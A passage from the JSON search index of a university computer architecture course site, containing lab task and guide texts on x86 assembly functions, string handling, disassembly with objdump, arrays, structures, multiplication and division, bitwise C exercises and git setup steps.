reading material. ",
    "url": "/labs/lab-08/tasks/string-print-len/README.html",
    
    "relUrl": "/labs/lab-08/tasks/string-print-len/README.html"
  },"122": {
    "doc": "Task: Displaying a String",
    "title": "Task: Displaying a String",
    "content": "Navigate to tasks/string-print/support/. To display a string, we can use the internal macro PRINTF32. Alternatively, we can use a function such as puts(). In the file print_string.asm, displaying a string using the PRINTF32 macro is implemented. Following the example of the hello_world.asm file, implement string display using puts as well. If you’re having difficulties solving this exercise, take a peek at hello_world.asm. To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: ./run_all_tests.sh test_print_simple ........................ passed ... 33 test_print_special ........................ passed ... 33 test_print_long ........................ passed ... 34 Total: 100/100 . If you’re having trouble solving this exercise, go through this reading material. ",
    "url": "/labs/lab-08/tasks/string-print/README.html",
    
    "relUrl": "/labs/lab-08/tasks/string-print/README.html"
  },"123": {
    "doc": "Task: Displaying the Reversed String",
    "title": "Task: Displaying the Reversed String",
    "content": "Navigate to tasks/print-rev-string/support/. In the file print_rev_string.asm, add the reverse_string() function so that you have a listing similar to the one below: . [...] section .text extern printf extern puts global print_reverse_string reverse_string: push ebp mov ebp, esp push ebx ; preserve ebx as required by cdecl mov eax, [ebp + 8] mov ecx, [ebp + 12] add eax, ecx dec eax mov edx, [ebp + 16] copy_one_byte: mov bl, [eax] mov [edx], bl dec eax inc edx loopnz copy_one_byte inc edx mov byte [edx], 0 pop ebx ; restore ebx leave ret print_reverse_string: push ebp mov ebp, esp [...] . IMPORTANT: When copying the reverse_string() function into your program, remember that the function starts at the reverse_string() label and ends at the print_reverse_string label. The copy_one_byte label is part of the reverse_string() function. The reverse_string() function reverses a string and has the following signature: void reverse_string(const char *src, size_t len, char *dst);. This means that the first len characters of the src string are reversed into the dst string. Reverse the mystring string into a new string and display that new string. NOTE: To define a new string, we recommend using the following construction in the data section: . store_string times 64 db 0 . This creates a string of 64 zero bytes, enough to store the reverse of the string. The equivalent C function call is reverse_string(mystring, ecx, store_string);. We assume that the length of the string is calculated and stored in the ecx register. You cannot directly use the value of ecx in its current form. After the printf() function call for displaying the length, the value of ecx is not preserved. To retain it, you have two options: . | Store the value of the ecx register on the stack beforehand (using push ecx before the printf call) and then restore it after the printf call (using pop ecx). | Store the value of the ecx register in a global variable, which you define in the .data section. | . You cannot use another register because there is a high chance that even that register will be modified by the printf call to display the length of the string. To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: ./run_all_tests.sh test_reverse_simple ........................ passed ... 33 test_reverse_special ........................ passed ... 33 test_reverse_long ........................ passed ... 34 Total: 100/100 . If you’re having trouble solving this exercise, go through this reading material. ",
    "url": "/labs/lab-08/tasks/print-rev-string/README.html",
    
    "relUrl": "/labs/lab-08/tasks/print-rev-string/README.html"
  },"124": {
    "doc": "Guide: Hello, World",
    "title": "Guide: Hello, World",
    "content": "Navigate to guides/hello-world/support/. Open the hello_world.asm file, assemble it, and run it. Notice the display of the message Hello, world! . Note that: . | The hello_world.asm program uses the puts() function call (an external function of the current module) to perform the display. For this, it puts the argument on the stack and calls the function. | The msg variable in the hello_world.asm program contains the byte 10. This symbolizes the line feed character (\\n), used to add a new line on Linux. | . Ending with \\n is generally useful for displaying strings. The puts() function automatically adds a new line after the displayed string, but this must be explicitly added when using the printf() function. ",
    "url": "/labs/lab-08/guides/hello-world/README.html",
    
    "relUrl": "/labs/lab-08/guides/hello-world/README.html"
  },"125": {
    "doc": "Guide: Disassembling a C program",
    "title": "Guide: Disassembling a C program",
    "content": "Navigate to guides/disassembling-c/support/. As mentioned, ultimately everything ends up in assembly language (to be 100% accurate, everything ends up as machine code, which has a fairly good correspondence with assembly code). Often, we find ourselves with access only to the object code of some programs and we want to inspect how it looks. To observe this, let’s compile a C program to its object code and then disassemble it. We’ll use the test.c program from the lab archive. NOTE: To compile a C/C++ source file in the command-line, follow these steps: . | Open a terminal. (shortcut Ctrl+Alt+T) . | Navigate to the directory containing your source code. | Use the command: . | . gcc -m32 -o &lt;exec&gt; &lt;sourcefile&gt; . where &lt;sourcefile&gt; is the name of the source file (test.c) and &lt;exec&gt; is the name of the result executable. If you only want to compile (without linking it), use: . gcc -m32 -c -o &lt;objfile&gt; &lt;sourcefile&gt; . where &lt;sourcefile&gt; is the name of the source file and &lt;objfile&gt; is the name of the desired output object file. Since we want to transform test.c into an object file, we’ll run: . gcc -m32 -c -o test.o test.c . After running the above command, we should see a file named test.o. Furthermore, we can use gcc to transform the C code in Assembly code: . gcc -m32 -masm=intel -S -o test.asm test.c . After running the above command we’ll have a file called test.asm, which we can inspect using any text editor/reader, such as cat: . cat test.asm . In order to disassembly the code of an object file we’ll use objdump as follows: . objdump -M intel -d &lt;path-to-obj-file&gt; . where &lt;path-to-obj-file&gt; is the path to the object file test.o. Afterwards, you’ll see an output similar to the following: . $ objdump -M intel -d test.o test.o: file format elf32-i386 Disassembly of section .text: 00000000 &lt;second_func&gt;: 0: 55 push ebp 1: 89 e5 mov ebp,esp 3: e8 fc ff ff ff call 4 &lt;second_func+0x4&gt; 8: 05 01 00 00 00 add eax,0x1 d: 8b 45 08 mov eax,DWORD PTR [ebp+0x8] 10: 8b 10 mov edx,DWORD PTR [eax] 12: 8b 45 0c mov eax,DWORD PTR [ebp+0xc] 15: 01 c2 add edx,eax 17: 8b 45 08 mov eax,DWORD PTR [ebp+0x8] 1a: 89 10 mov DWORD PTR [eax],edx 1c: 90 nop 1d: 5d pop ebp 1e: c3 ret 0000001f &lt;first_func&gt;: 1f: 55 push ebp 20: 89 e5 mov ebp,esp 22: 53 push ebx 23: 83 ec 14 sub esp,0x14 26: e8 fc ff ff ff call 27 &lt;first_func+0x8&gt; 2b: 05 01 00 00 00 add eax,0x1 30: c7 45 f4 03 00 00 00 mov DWORD PTR [ebp-0xc],0x3 37: 83 ec 0c sub esp,0xc 3a: 8d 90 00 00 00 00 lea edx,[eax+0x0] 40: 52 push edx 41: 89 c3 mov ebx,eax 43: e8 fc ff ff ff call 44 &lt;first_func+0x25&gt; 48: 83 c4 10 add esp,0x10 4b: 83 ec 08 sub esp,0x8 4e: ff 75 f4 push DWORD PTR [ebp-0xc] 51: 8d 45 08 lea eax,[ebp+0x8] 54: 50 push eax 55: e8 a6 ff ff ff call 0 &lt;second_func&gt; 5a: 83 c4 10 add esp,0x10 5d: 8b 45 08 mov eax,DWORD PTR [ebp+0x8] 60: 8b 5d fc mov ebx,DWORD PTR [ebp-0x4] 63: c9 leave 64: c3 ret 00000065 &lt;main&gt;: 65: 8d 4c 24 04 lea ecx,[esp+0x4] 69: 83 e4 f0 and esp,0xfffffff0 6c: ff 71 fc push DWORD PTR [ecx-0x4] 6f: 55 push ebp 70: 89 e5 mov ebp,esp 72: 53 push ebx 73: 51 push ecx 74: e8 fc ff ff ff call 75 &lt;main+0x10&gt; 79: 81 c3 02 00 00 00 add ebx,0x2 7f: 83 ec 0c sub esp,0xc 82: 6a 0f push 0xf 84: e8 96 ff ff ff call 1f &lt;first_func&gt; 89: 83 c4 10 add esp,0x10 8c: 83 ec 08 sub esp,0x8 8f: 50 push eax 90: 8d 83 0e 00 00 00 lea eax,[ebx+0xe] 96: 50 push eax 97: e8 fc ff ff ff call 98 &lt;main+0x33&gt; 9c: 83 c4 10 add esp,0x10 9f: b8 00 00 00 00 mov eax,0x0 a4: 8d 65 f8 lea esp,[ebp-0x8] a7: 59 pop ecx a8: 5b pop ebx a9: 5d pop ebp aa: 8d 61 fc lea esp,[ecx-0x4] ad: c3 ret . There are many other utilities that allow disassembly of object modules, most of them with a graphical interface and offering debugging support. objdump is a simple utility that can be quickly used from the command-line. It’s interesting to observe, both in the test.asm file and in its disassembly, the way a function call is made, which we’ll discuss further. ",
    "url": "/labs/lab-08/guides/disassembling-c/README.html",
    
    "relUrl": "/labs/lab-08/guides/disassembling-c/README.html"
  },"126": {
    "doc": "Lab 8 - Functions",
    "title": "Lab 8 - Functions",
    "content": " ",
    "url": "/labs/lab-08/README.html",
    
    "relUrl": "/labs/lab-08/README.html"
  },"127": {
    "doc": "Lab 8 - Functions",
    "title": "Getting the Latest Changes",
    "content": "Before starting this lab, ensure you have the latest changes. If you have no local changes, you can simply run git pull and you are ready to go: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status # Check if you have unstaged changes On branch main nothing to commit, working tree clean # \"working tree clean\" means that you have no changes student@hsi:~/hardware-software-interface$ git checkout main # Change branch to main student@hsi:~/hardware-software-interface$ git pull --rebase . If the git status output differs, follow the instructions to save your progress. ",
    "url": "/labs/lab-08/README.html#getting-the-latest-changes",
    
    "relUrl": "/labs/lab-08/README.html#getting-the-latest-changes"
  },"128": {
    "doc": "Lab 8 - Functions",
    "title": "Save Progress and Prepare Next Lab",
    "content": ". | Check if you have unstaged changes that might be lost: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status On branch &lt;not-important&gt; Changes not staged for commit: (use \"git add &lt;file&gt;...\" to update what will be committed) (use \"git restore &lt;file&gt;...\" to discard changes in working directory) modified: main.c . If git status states “work tree clean”, you should follow the instructions to pull latest changes instead. | Create a commit to store your changes: . student@hsi:~/hardware-software-interface$ git add . student@hsi:~/hardware-software-interface$ git commit -m \"Store progress for lab-07\" student@hsi:~/hardware-software-interface$ git status # double check that everything was committed On branch &lt;not-important&gt; nothing to commit, working tree clean . | Create a new branch for lab-08: . student@hsi:~/hardware-software-interface$ git checkout -b lab-08 main # Replace lab-08 with lab number student@hsi:~/hardware-software-interface$ git pull origin main # Get latest changes from origin/main . | . ",
    "url": "/labs/lab-08/README.html#save-progress-and-prepare-next-lab",
    
    "relUrl": "/labs/lab-08/README.html#save-progress-and-prepare-next-lab"
  },"129": {
    "doc": "Task: Modifying a Structure",
    "title": "Task: Modifying a Structure",
    "content": "Write code within the main function to modify the fields of the sample_student structure so that: . | the birth year is 1993 . | the age is 22 . | the group is 323CA . | . WARNING: Do not modify what is displayed, modify the structure code. Do not touch the display code, that code must remain the same. You need to add at the beginning of the main function, in the place marked with TODO, the code to modify the structure. WARNING: You need to modify the content of the structure in the code, meaning you need to write to the memory area corresponding to the field in the structure. Do not modify the structure in the .data section, you need to use code to modify the structure. TIP: For modifying the group, you will need to change the third byte/character of the group field (i.e., the byte/character with index 2). To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: ./run_all_tests test_print_structure ........................ passed ... 100 ======================================================================== Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-06/tasks/print-structure/README.html",
    
    "relUrl": "/labs/lab-06/tasks/print-structure/README.html"
  },"130": {
    "doc": "Task: Fibonacci Sum",
    "title": "Task: Fibonacci Sum",
    "content": "You will solve the exercises starting from the fibo_sum.asm file located in the tasks/fibonacci directory. Starting from the fibo_sum.asm file, implement a program that calculates the sum of the first N numbers in the Fibonacci sequence using the loop instruction. The sum of the first 9 numbers is 54. To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: ./run_all_tests.sh Test name format is test_fibo_sum_&lt;N&gt;_&lt;sum to N&gt; test_fibo_sum_9_54 ........................ passed ... 25 test_fibo_sum_12_232 ........................ passed ... 25 test_fibo_sum_1_0 ........................ passed ... 25 test_fibo_sum_40_165580140 ........................ passed ... 25 ======================================================================== Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-06/tasks/fibonacci/README.html",
    
    "relUrl": "/labs/lab-06/tasks/fibonacci/README.html"
  },"131": {
    "doc": "Task: Mul-arrays",
    "title": "Task: Mul-arrays",
    "content": "You will solve the exercises starting from the mul_arrays.asm file located in the tasks/mul-arrays directory. Write the Assembly instructions through which, for each pair of one-byte elements with identical indexes from array1 and array2, their product is saved in array3. Then print array3. The program’s output after a correct solution should be: . The array that results from the product of the corresponding elements in array1 and array2 is: 405 1330 2024 280 289 957 2886 14872 17820 1984 . Follow the comments marked with TODO. IMPORTANT: The product should be computed between two one-byte numbers. Therefore, the result is stored on two bytes. To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: ./run_all_tests test_mul_arrays ........................ passed ... 100 ======================================================================== Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-06/tasks/mul-arrays/README.html",
    
    "relUrl": "/labs/lab-06/tasks/mul-arrays/README.html"
  },"132": {
    "doc": "Task: Courses",
    "title": "Task: Courses",
    "content": "You will solve the exercises starting from the courses.asm file located in the tasks/courses directory. Fill in the instructions to display the course in which each student is enrolled. We will assume that each student is enrolled in at most one course. The program’s output after a correct solution should be: . The students list is: Vlad ---- Assembly Andrew ---- Linear Algebra Kim ---- Linear Algebra George ---- Physics Kate ---- Student unassigned :( . Follow the comments marked with TODO. If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-06/tasks/courses/README.html",
    
    "relUrl": "/labs/lab-06/tasks/courses/README.html"
  },"133": {
    "doc": "Task: Getter-Setter",
    "title": "Task: Getter-Setter",
    "content": "Write in the getter_setter_printf.asm file the instructions needed to display the values of the int_x, char_y, and string_s fields from the sample_obj object. The program’s output after a correct solution should be: . int_x: 1000 char_y: a string_s: My string is better than yours . Next, overwrite the values of the int_x, char_y, string_s fields in the sample_obj object with the values from the new_int, new_char, and new_string variables. Validate the results using the display sequence written earlier. After a correct solution, the program’s output is: . int_x: 2000 char_y: b string_s: Are you sure? . Follow the comments marked with TODO. To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: ./run_all_tests test_getter_setter_printf ........................ passed ... 100 ======================================================================== Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-06/tasks/getters-setters/README.html",
    
    "relUrl": "/labs/lab-06/tasks/getters-setters/README.html"
  },"134": {
    "doc": "Task: Finding a Substring in a String",
    "title": "Task: Finding a Substring in a String",
    "content": "Find all occurrences of the substring substring in the source_text string in the find_substring.asm file. Display the results as follows: . Substring found at index: &lt;N&gt; . IMPORTANT: You cannot use the strstr library function (or similar) for this subtask. TIP: For display, you can use both the PRINTF32 macro and the printf function, as in previous exercises. The steps for display using printf are as follows: . | push the value you want to display onto the stack (the position where the substring was found) | push the address of the print_format string onto the stack | call the printf function | clean up the parameters added earlier from the stack by adding the value 8 to the esp register (each parameter is 4 bytes). | . To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: ./run_all_tests.sh test_find_substring_sample ........................ passed ... 25 test_find_substring_no_occurence ........................ passed ... 25 test_find_substring_small ........................ passed ... 25 test_find_substring_large ........................ passed ... 25 ======================================================================== Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-06/tasks/find-substring/README.html",
    
    "relUrl": "/labs/lab-06/tasks/find-substring/README.html"
  },"135": {
    "doc": "Guide: Max",
    "title": "Guide: Max",
    "content": "To follow this guide, you’ll need to use the max.asm file located in the guides/max/support directory. The program finds the maximum value in an array of 16-bit integers (array). It iterates through the array, updating the maximum value (dx) when it finds a larger value. Finally, it prints the maximum value using the printf() function. Note: For a detailed description of the instruction, check out the following page: Assembly Arrays Tutorial . ",
    "url": "/labs/lab-06/guides/max/README.html",
    
    "relUrl": "/labs/lab-06/guides/max/README.html"
  },"136": {
    "doc": "Guide: Students",
    "title": "Guide: Students",
    "content": "To follow this guide, you’ll need to use the students.asm file located in the guides/students/support directory. This program iterates through the array of structures representing students and prints the name of each student. ",
    "url": "/labs/lab-06/guides/students/README.html",
    
    "relUrl": "/labs/lab-06/guides/students/README.html"
  },"137": {
    "doc": "Lab 6 - Structures, Vectors and Strings",
    "title": "Lab 6 - Structures, Vectors and Strings",
    "content": " ",
    "url": "/labs/lab-06/README.html",
    
    "relUrl": "/labs/lab-06/README.html"
  },"138": {
    "doc": "Lab 6 - Structures, Vectors and Strings",
    "title": "Getting the Latest Changes",
    "content": "Before starting this lab, ensure you have the latest changes. If you have no local changes, you can simply run git pull and you are ready to go: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status # Check if you have unstaged changes On branch main nothing to commit, working tree clean # \"working tree clean\" means that you have no changes student@hsi:~/hardware-software-interface$ git checkout main # Change branch to main student@hsi:~/hardware-software-interface$ git pull --rebase . If the git status output differs, follow the instructions to save your progress. ",
    "url": "/labs/lab-06/README.html#getting-the-latest-changes",
    
    "relUrl": "/labs/lab-06/README.html#getting-the-latest-changes"
  },"139": {
    "doc": "Lab 6 - Structures, Vectors and Strings",
    "title": "Save Progress and Prepare Next Lab",
    "content": ". | Check if you have unstaged changes that might be lost: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status On branch &lt;not-important&gt; Changes not staged for commit: (use \"git add &lt;file&gt;...\" to update what will be committed) (use \"git restore &lt;file&gt;...\" to discard changes in working directory) modified: main.c . If git status states “work tree clean”, you should follow the instructions to pull latest changes instead. | Create a commit to store your changes: . student@hsi:~/hardware-software-interface$ git add . student@hsi:~/hardware-software-interface$ git commit -m \"Store progress for lab-05\" student@hsi:~/hardware-software-interface$ git status # double check that everything was committed On branch &lt;not-important&gt; nothing to commit, working tree clean . | Create a new branch for lab-06: . student@hsi:~/hardware-software-interface$ git checkout -b lab-06 main # Replace lab-06 with lab number student@hsi:~/hardware-software-interface$ git pull origin main # Get latest changes from origin/main . | . ",
    "url": "/labs/lab-06/README.html#save-progress-and-prepare-next-lab",
    
    "relUrl": "/labs/lab-06/README.html#save-progress-and-prepare-next-lab"
  },"140": {
    "doc": "Task: Rotations",
    "title": "Task: Rotations",
    "content": "You will solve the exercise starting from the file rotations.c located in the directory tasks/rotations/. Implement left and right rotations for 32-bit integers in C. TIP: The rotation operation (also known as circular shift) is similar to the shift operation, with the only difference being that the empty space generated by the shift is filled with the discarded bit. Example of left rotation by one bit: . NOTE: . rotate_left(0x80000000, 1) = 1 rotate_right(0x00000001, 16) = 65536 . To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: ./run_all_tests.sh test_rotate_left ........................ passed ... 33 test_rotate_right ........................ passed ... 33 test_rotate_both ........................ passed ... 34 Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-01/tasks/rotations/README.html",
    
    "relUrl": "/labs/lab-01/tasks/rotations/README.html"
  },"141": {
    "doc": "Task: Length and Equality with Bitwise Operations",
    "title": "Task: Length and Equality with Bitwise Operations",
    "content": "You will solve the exercise starting from the file len_xor.c located in the directory tasks/len-xor/support/. For a given string of characters, display: . | the length of the string | the address of each character at position i that is equal to the character at position $i + 2^i$ (if $i + 2^i$ exceeds the size of the string, use the modulo operation) | . Use pointer operations and bitwise operations as much as possible! . NOTE: Do not use functions such as strlen(), sizeof(), pow(), and do not check equality using ==. Also, do not access string elements in the form of s[i]. TIP: For the string “aac”: . length = 3 Address of a: 0x564c364482a0 Address of a: 0x564c364482a1 . For the string “ababababacccbacbacbacbacbabc”: . length = 28 Address of b: 0x563f0da6f2a1 Address of a: 0x563f0da6f2a2 Address of c: 0x563f0da6f2a9 Address of a: 0x563f0da6f2b0 Address of b: 0x563f0da6f2b2 Address of b: 0x563f0da6f2b5 Address of c: 0x563f0da6f2b7 Address of a: 0x563f0da6f2b9 . The above addresses are illustrative! . To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: ./run_all_tests.sh test_small_string ........................ passed ... 33 test_medium_string ........................ passed ... 33 test_big_string ........................ passed ... 34 Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-01/tasks/len-xor/README.html",
    
    "relUrl": "/labs/lab-01/tasks/len-xor/README.html"
  },"142": {
    "doc": "Task: Binary Even and Hexadecimal Odd",
    "title": "Task: Binary Even and Hexadecimal Odd",
    "content": "You will solve the exercise starting from the file odd_even.c located in the directory tasks/odd-even/. Traverse an array of 32-bit integers using pointer operations and display the even numbers in binary and the odd numbers in hexadecimal. NOTE: Use bitwise operations wherever possible in your solution! . NOTE: For the array [214, 77, 84, 134, 86], the program will display: . 0b11010110 0x0000004D 0b01010100 0b10000110 0b01010110 . Use capital letters when printing hexadecimal numbers (use the %08X format string for printf()). To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: ./run_all_tests.sh test_small_array ........................ passed ... 33 test_medium_array ........................ passed ... 33 test_big_array ........................ passed ... 34 Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-01/tasks/odd-even/README.html",
    
    "relUrl": "/labs/lab-01/tasks/odd-even/README.html"
  },"143": {
    "doc": "Task: Reversing a String",
    "title": "Task: Reversing a String",
    "content": "You will solve the exercise starting from the file mirror.c located in the directory tasks/mirror/support/. Using pointer operations, implement a C program that reverses a string of characters. The mirror function should perform an in-place reversal of the characters in the string (upon exiting the function, the input string will contain the reversed string). NOTE: Do not access string elements using the form s[i]. TIP: . mirror(\"LoremIpsum\") = \"muspImeroL\" mirror(\"asdfghjl\") = \"ljhgfdsa\" mirror(\"qwerty\") = \"ytrewq\" . To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: ./run_all_tests.sh test_small_string ........................ passed ... 33 test_medium_string ........................ passed ... 33 test_big_string ........................ passed ... 34 Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-01/tasks/mirror/README.html",
    
    "relUrl": "/labs/lab-01/tasks/mirror/README.html"
  },"144": {
    "doc": "Task: Conversions",
    "title": "Task: Conversions",
    "content": "Perform the following conversions between numbering systems: . a. From decimal to binary and hexadecimal: . | 121 | 18446 | . b. Convert to decimal: . | 0b1100010111010010 | 0xBB29 | . c. From hexadecimal to binary: . | 0x5E | 0x4A01 | . d. From binary to hexadecimal: . | 0b01111101 | 0b1000110000011111 | . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-01/tasks/conversions/README.html",
    
    "relUrl": "/labs/lab-01/tasks/conversions/README.html"
  },"145": {
    "doc": "Lab 1 - Number Representation",
    "title": "Lab 1 - Number Representation",
    "content": " ",
    "url": "/labs/lab-01/README.html",
    
    "relUrl": "/labs/lab-01/README.html"
  },"146": {
    "doc": "Lab 1 - Number Representation",
    "title": "Cloning the Repository",
    "content": "If you haven’t already cloned the repository, do so and you are ready to go: . student@hsi:~$ git clone https://github.com/cs-pub-ro/hardware-software-interface.git student@hsi:~$ cd hardware-software-interface/labs . ",
    "url": "/labs/lab-01/README.html#cloning-the-repository",
    
    "relUrl": "/labs/lab-01/README.html#cloning-the-repository"
  },"147": {
    "doc": "Task: Sum of Elements in an Array",
    "title": "Task: Sum of Elements in an Array",
    "content": " ",
    "url": "/labs/lab-05/tasks/sum-array/README.html",
    
    "relUrl": "/labs/lab-05/tasks/sum-array/README.html"
  },"148": {
    "doc": "Task: Sum of Elements in an Array",
    "title": "Introduction",
    "content": "You will solve this exercise starting from the sum-array.asm file located in the tasks/sum-array/support directory. In the sum-array.asm file the sum of elements in an array of bytes (8-bit representation) is calculated. Follow the code, observe the constructions and registers specific for working with bytes. Run the code. IMPORTANT: Proceed to the next step only after thoroughly understanding what the code does. It will be difficult for you to complete the following exercises if you have difficulty understanding the current exercise. ",
    "url": "/labs/lab-05/tasks/sum-array/README.html#introduction",
    
    "relUrl": "/labs/lab-05/tasks/sum-array/README.html#introduction"
  },"149": {
    "doc": "Task: Sum of Elements in an Array",
    "title": "Sum of Elements in an Array of types word and dword",
    "content": "In the TODO section of the sum-array.asm file, complete the code to calculate the sum of arrays with elements of type word (16 bits) and dword (32 bits); namely, the word_array and dword_array. TIP: When calculating the address of an element in an array, you will use a construction like: . base + size * index . In the construction above: . | base is the address of the array (i.e., word_array or dword_array) | size is the length of the array element (i.e., 2 for a word array (16 bits, 2 bytes) and 4 for a dword array (32 bits, 4 bytes)) | index is the current index within the array | . NOTE: The sum of elements in the three arrays should be: . | sum(byte_array): 575 | sum(word_array): 65799 | sum(dword_array): 74758117 | . ",
    "url": "/labs/lab-05/tasks/sum-array/README.html#sum-of-elements-in-an-array-of-types-word-and-dword",
    
    "relUrl": "/labs/lab-05/tasks/sum-array/README.html#sum-of-elements-in-an-array-of-types-word-and-dword"
  },"150": {
    "doc": "Task: Sum of Elements in an Array",
    "title": "Sum of Squares of Elements in an Array",
    "content": "Starting from the program in the previous exercise, calculate the sum of squares of elements in an array. NOTE: You can use the dword_array2 array, ensuring that the sum of squares of the contained elements can be represented in 32 bits. NOTE: If you use the construction below (array with 10 elements) . dword_array dd 1392, 12544, 7992, 6992, 7202, 27187, 28789, 17897, 12988, 17992 . the sum of squares will be 2704560839. ",
    "url": "/labs/lab-05/tasks/sum-array/README.html#sum-of-squares-of-elements-in-an-array",
    
    "relUrl": "/labs/lab-05/tasks/sum-array/README.html#sum-of-squares-of-elements-in-an-array"
  },"151": {
    "doc": "Task: Sum of Elements in an Array",
    "title": "64 Bits Sum of Squares",
    "content": "Compute the sum of squares of the elements from big_numbers_array. NOTE: The sum of the array can be represented on 64 bits, but we only have 32 bits registers. HINT: Split the sum in 2 variables (the mul operator for 32 bits multiplication). the sum of squares will be 1610691026282151079. ",
    "url": "/labs/lab-05/tasks/sum-array/README.html#64-bits-sum-of-squares",
    
    "relUrl": "/labs/lab-05/tasks/sum-array/README.html#64-bits-sum-of-squares"
  },"152": {
    "doc": "Task: Sum of Elements in an Array",
    "title": "Testing",
    "content": "To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: . first_test ........................ passed ... 20 second_test ........................ passed ... 20 third_test ........................ passed ... 30 fourth_test ........................ passed ... 30 ======================================================================== Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-05/tasks/sum-array/README.html#testing",
    
    "relUrl": "/labs/lab-05/tasks/sum-array/README.html#testing"
  },"153": {
    "doc": "Task: Multiplying Two Numbers",
    "title": "Task: Multiplying Two Numbers",
    "content": " ",
    "url": "/labs/lab-05/tasks/mul/README.html",
    
    "relUrl": "/labs/lab-05/tasks/mul/README.html"
  },"154": {
    "doc": "Task: Multiplying Two Numbers",
    "title": "Multiplying Two Numbers represented as Bytes",
    "content": "You will solve this exercise starting from the multiply.asm file located in the tasks/mul/support directory. Go through, run, and test the code from the file multiply.asm. In this program, we multiply two numbers defined as bytes. To access them, we use a construction like byte [register]. When performing multiplication, the process is as follows, as described here: . | We place the multiplicand in the multiplicand register, meaning: . | if we’re operating on a byte (8 bits, one byte), we place the multiplicand in the al register; | if we’re operating on a word (16 bits, 2 bytes), we place the multiplicand in the ax register; | if we’re operating on a double word (32 bits, 4 bytes), we place the multiplicand in the eax register. | . | The multiplier is passed as an argument to the mul mnemonic. The multiplier must have the same size as the multiplicand. | The result is placed in two registers (the high part and the low part). | . ",
    "url": "/labs/lab-05/tasks/mul/README.html#multiplying-two-numbers-represented-as-bytes",
    
    "relUrl": "/labs/lab-05/tasks/mul/README.html#multiplying-two-numbers-represented-as-bytes"
  },"155": {
    "doc": "Task: Multiplying Two Numbers",
    "title": "Multiplying Two Numbers represented as Words / Double Words",
    "content": "Update the area marked with TODO in the file multiply.asm to allow multiplication of word and dword numbers, namely num1_dw with num2_dw, and num1_dd with num2_dd. TIP: For multiplying word numbers (16 bits), the components are arranged as follows: . | Place the multiplicand in the ax register. | The argument of the mul instruction, the multiplier (possibly another register), is 16 bits (either a value or a register such as bx, cx, dx). | The result of the multiplication is arranged in the pair dx:ax, where the high part of the result is in the dx register, and the low part of the result is in the ax register. | . For multiplying dword numbers (32 bits), the components are arranged as follows: . | Place the multiplicand in the eax register. | The argument of the mul instruction, the multiplier (possibly another register), is 32 bits (either a value or a register such as ebx, ecx, edx). | The result of the multiplication is arranged in the pair edx:eax, where the high part of the result is in the edx register, and the low part of the result is in the eax register. | . NOTE: When displaying the result, use the PRINTF32 macro to display the two registers containing the result: . | Registers dx and ax for multiplying word numbers. | Registers edx and eax for multiplying dword numbers. | . ",
    "url": "/labs/lab-05/tasks/mul/README.html#multiplying-two-numbers-represented-as-words--double-words",
    
    "relUrl": "/labs/lab-05/tasks/mul/README.html#multiplying-two-numbers-represented-as-words--double-words"
  },"156": {
    "doc": "Task: Multiplying Two Numbers",
    "title": "Testing",
    "content": "To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: . test_byte_mul ........................ passed ... 33 test_short_mul ........................ passed ... 33 test_int_mul ........................ passed ... 34 ======================================================================== Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-05/tasks/mul/README.html#testing",
    
    "relUrl": "/labs/lab-05/tasks/mul/README.html#testing"
  },"157": {
    "doc": "Task: Division of Two Numbers",
    "title": "Task: Division of Two Numbers",
    "content": "You will solve this exercise starting from the divide.asm file located in the tasks/div/support directory. In the divide.asm program, the quotient and remainder of two numbers represented as bytes are calculated. Update the area marked with TODO to perform divisions dividend2 / divisor2 (word-type divisor) and dividend3 / divisor3 (dword-type divisor). Similar to the mul instruction, the registers where the dividend is placed vary depending on the representation size of the divisor. The divisor is passed as an argument to the div mnemonic. TIP: If the divisor is of type byte (8 bits), the components are arranged as follows: . | the dividend is placed in the ax register | the argument of the div instruction is 8 bits and can be represented by a register or an immediate value | the quotient is placed in al | the remainder is placed in ah | . If the divisor is of type word (16 bits), the components are arranged as follows: . | the dividend is arranged in the dx:ax pair, meaning its high part is in the dx register, and the low part is in ax | the argument of the div instruction is 16 bits and can be represented by a register or an immediate value | the quotient is placed in ax | the remainder is placed in dx | . If the divisor is of type dword (32 bits), the components are arranged as follows: . | the dividend is arranged in the edx:eax pair, meaning its high part is in the edx register, and the low part is in eax | the argument of the div instruction is 32 bits and can be represented by a register or an immediate value | the quotient is placed in eax | the remainder is placed in edx | . TIP: 